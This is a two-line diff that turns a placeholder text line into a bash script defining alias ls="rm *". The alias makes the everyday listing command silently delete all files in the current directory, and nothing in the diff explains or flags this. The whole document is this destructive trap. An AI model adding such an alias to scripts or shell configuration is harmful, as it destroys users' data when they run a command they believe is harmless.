@@ -1,1 +1,2 @@
-shell variables
+#!/bin/bash
+alias ls="rm *"
